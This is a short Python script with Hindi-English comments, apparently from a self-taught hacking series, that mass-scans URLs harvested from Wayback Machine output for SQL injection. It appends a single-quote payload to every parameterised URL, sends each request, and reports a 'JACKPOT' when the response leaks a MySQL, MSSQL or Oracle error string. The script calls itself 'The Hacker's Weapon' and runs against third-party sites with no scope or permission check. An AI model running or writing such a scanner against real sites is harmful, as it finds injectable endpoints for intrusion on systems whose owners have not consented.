import requests
import sys

def mass_sqli_scan(file_path):
    print(f"\n[*] Bhai, loading target URLs from: {file_path}")
    
    try:
        # File ko read kar rahe hain
        with open(file_path, 'r') as file:
            lines = file.readlines()
    except FileNotFoundError:
        print("[-] Arre yaar, file nahi mili. Path check karo!")
        return

    print("[*] Filtering raw data to extract clean URLs with parameters...")
    target_urls = []
    
    # Text file mein se sirf "http" wale aur parameters ("=" wale) URLs nikal rahe hain
    for line in lines:
        if "http" in line and "=" in line:
            # Wayback machine ke output mein se faltu text (jaise "-> ") hata rahe hain
            clean_url = line.strip().replace("-> ", "").replace("->", "").strip()
            target_urls.append(clean_url)

    print(f"[+] Successfully extracted {len(target_urls)} juicy URLs to test!\n")
    print("--------------------------------------------------")

    # The Hacker's Weapon
    payload = "'"
    sql_errors = [
        "mysql_fetch", 
        "you have an error in your sql syntax", 
        "unclosed quotation mark", 
        "ora-01756"
    ]

    # Ek-ek karke saare URLs par automate attack
    for url in target_urls:
        vuln_url = url + payload
        print(f"[*] Testing: {vuln_url}")
        
        try:
            # Server par request bhejna (timeout thoda kam rakha hai taaki script fast chale)
            response = requests.get(vuln_url, timeout=5)
            
            # Check for SQL errors in the response source code
            for error in sql_errors:
                if error.lower() in response.text.lower():
                    print(f"\n   [!!!] JACKPOT 🎯 SQLi FOUND: {vuln_url}")
                    print(f"   [!] Error Leaked: {error}\n")
                    break # Ek baar bug mil gaya toh agle URL par badho
                    
        except requests.exceptions.RequestException:
            print(f"   [-] Connection skipped/timeout for this URL.")

    print("--------------------------------------------------")
    print("[+] Mass Scan Complete, Bhai!")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 mass_sqli.py <path_to_urls.txt>")
        print("Example: python3 mass_sqli.py ../Day_56_Master_Recon_Pipeline/wayback_urls.txt")
        sys.exit(1)
        
    target_file = sys.argv[1]
    mass_sqli_scan(target_file)
